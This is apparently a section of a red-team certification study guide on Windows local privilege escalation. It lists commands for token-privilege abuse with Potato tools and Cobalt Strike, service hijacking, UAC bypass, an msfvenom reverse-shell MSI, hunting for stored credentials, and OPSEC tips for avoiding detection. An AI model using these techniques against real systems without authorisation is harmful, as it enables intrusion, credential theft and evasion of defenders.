## 8. Local privilege escalation

You usually land as a normal user or a service account. Local admin on a workstation is often enough to move laterally; SYSTEM is needed for SAM/LSA on the host and for some service abuse.

### 8.1 Enumerate before you exploit

```text
whoami /all
whoami /priv
whoami /groups
systeminfo
wmic qfe get HotFixID,InstalledOn
wmic service get name,displayname,pathname,startmode
sc query state= all
schtasks /query /fo LIST /v
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=all -full
```

**Priority order for the exam:**
1. Token privileges (`SeImpersonate`, `SeAssignPrimaryToken`, `SeDebug`, `SeBackup`, `SeRestore`, `SeTakeOwnership`, `SeLoadDriver`).
2. Service misconfigurations (weak permissions, unquoted paths, DLL hijack).
3. UAC bypass (if already local admin but medium integrity).
4. AlwaysInstallElevated.
5. Credentials in files / registry.
6. Kernel exploits — last resort; they crash hosts and are rarely needed.

### 8.2 Token privileges

| Privilege | What it enables | Quiet approach |
|---|---|---|
| `SeImpersonatePrivilege` | Impersonate a client → Potato family → SYSTEM | Potato matching the OS build |
| `SeAssignPrimaryTokenPrivilege` | Assign a token to a process | Potato family |
| `SeDebugPrivilege` | Open any process → LSASS | Loud; avoid unless necessary |
| `SeBackupPrivilege` | Read files bypassing ACLs → SAM/SYSTEM | `robocopy /b` or `reg save` |
| `SeRestorePrivilege` | Write files bypassing ACLs | Overwrite a service binary |
| `SeTakeOwnershipPrivilege` | Take ownership of objects | `takeown` + `icacls` |
| `SeLoadDriverPrivilege` | Load a driver | Driver abuse; high risk |

```text
# Cobalt Strike built-in (named-pipe impersonation)
getsystem

# Or elevate a listener
elevate svc-exe <listener>
```

**OPSEC:** `getsystem` creates a named pipe and impersonates; it is a known pattern but far quieter than a Kernel exploit. It still produces process/token telemetry.

### 8.3 Potato family (SeImpersonate → SYSTEM)

Choose by OS/build:

| Tool | Target | Example |
|---|---|---|
| `GodPotato` | Modern Windows (2012–2022+) | `GodPotato.exe -cmd "cmd /c whoami"` |
| `SweetPotato` | Mixed | `SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-nop -w hidden -enc <b64>"` |
| `PrintSpoofer` | Print Spooler present | `PrintSpoofer.exe -i -c cmd` |
| `RoguePotato` | Modern, needs redirect | `RoguePotato.exe -r <ip> -l 9999 -e "cmd /c whoami"` |
| `JuicyPotato` | Older (<2019) | `JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *` |

```text
# Typical: run from a writable path, capture output or spawn a beacon
upload C:\Tools\GodPotato.exe C:\Windows\Temp\gp.exe
run C:\Windows\Temp\gp.exe -cmd "cmd /c whoami"
del C:\Windows\Temp\gp.exe
```

**OPSEC:** the exploit creates a process and often a COM/RPC listener; some variants bind a port. Delete the binary. Do not run multiple variants on the same host.

### 8.4 Service misconfigurations

```text
# Enumerate
sc qc <service>
sc query <service>
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows"
accesschk.exe /accepteula -uwcqv "Everyone" *
accesschk.exe /accepteula -uwcqv "Users" *
icacls "C:\Path\To\Service"
icacls "C:\Path\To\Service.exe"
```

**Unquoted service path** — a path like `C:\Program Files\Vendor\Service\svc.exe` without quotes lets you plant `C:\Program Files\Vendor\Service.exe`.

```text
sc qc <service>
# If path is unquoted and a writable directory exists earlier in the path:
upload C:\Tools\payload.exe "C:\Program Files\Vendor\Service.exe"
sc stop <service>
sc start <service>
```

**Weak service permissions** — if your user can change the binary path:

```text
sc config <service> binPath= "C:\Windows\Temp\evil.exe"
sc stop <service>
sc start <service>
```

**Weak binary permissions** — if you can overwrite the service binary:

```text
copy /y C:\Windows\Temp\evil.exe "C:\Program Files\Vendor\service.exe"
sc stop <service>
sc start <service>
```

**DLL hijacking** — if the service loads a DLL from a writable directory, place a proxy DLL there. Use a signed proxy or a known DLL-search-order path.

**OPSEC:** service changes produce **7045/4697**, `sc` command lines (4688), and often a new process. Restore the original `binPath` and delete the payload when done. Never do this on a Tier-0 server unless the objective requires it.

### 8.5 UAC bypass (local admin, medium integrity)

If you are in the local `Administrators` group but running at medium integrity, you need an elevated token.

```text
# Cobalt Strike
elevate uac-schtasks <listener>       # scheduled-task UAC bypass
elevate uac-token-duplication <listener>

# Check integrity
whoami /groups | findstr /i "Mandatory"
```

**OPSEC:** UAC bypasses leave registry/COM/task artifacts and often spawn `fodhelper.exe`, `computerdefaults.exe`, or `sdclt.exe`. These are well-signatured. Prefer a legitimate elevated path (a service you already control, a scheduled task, or a token you stole).

### 8.6 AlwaysInstallElevated

If both HKLM and HKCU policies are set to `1`, any user can install an MSI as SYSTEM.

```text
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generate an MSI that runs a command
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

```bash
# Operator side: build the MSI with msfvenom or wixtoolset
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f msi -o evil.msi
```

**OPSEC:** `msiexec` execution and an installer log; usually obvious. Use only if it is the clean path.

### 8.7 Scheduled tasks, autoruns, and startup

```text
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /i "TaskName Run As Mode"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\StartUp"
```

**OPSEC:** creating a task is 4698; modifying one is 4702. For persistence discussion, see Section 14.

### 8.8 Credentials in files and registry

```text
# Unattended installs
dir /s /b C:\unattend.xml C:\sysprep.inf C:\sysprep\sysprep.xml
findstr /si "password" C:\*.xml C:\*.ini C:\*.config 2>nul

# Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# PowerShell history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Common config locations
dir /s /b C:\inetpub\wwwroot\web.config
type C:\inetpub\wwwroot\web.config | findstr /i "connectionString password"
```

**OPSEC:** read-only and quiet. This is often the best first move.

### 8.9 Kernel exploits (last resort)

Kernel exploits (e.g., older `MS16-032`, `CVE-2021-1732`, `CVE-2022-21882`) are rarely necessary on CRTO and are high-risk: a failed exploit bluescreens the host and ends that path. Only use one if:
- The host is disposable (a Tier-2 workstation), and
- You have verified the build is vulnerable, and
- You have a fallback path.

### 8.10 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `getsystem` fails | SeImpersonate missing, or no suitable service | Check `whoami /priv`; try a Potato |
| Potato fails with `RPC` error | OS build mismatch | Try GodPotato/SweetPotato; specify a different COM port |
| `sc start` access denied | Service ACL, not binary ACL | `sc sdshow <service>`; try a different service |
| Service starts then stops | Payload crashes / wrong arch | Match x86/x64; test the payload standalone |
| UAC bypass does nothing | UAC disabled already, or path blocked | Check integrity; try another method |
| `msiexec` blocked | AppLocker/WDAC/policy | Use a service or task path instead |

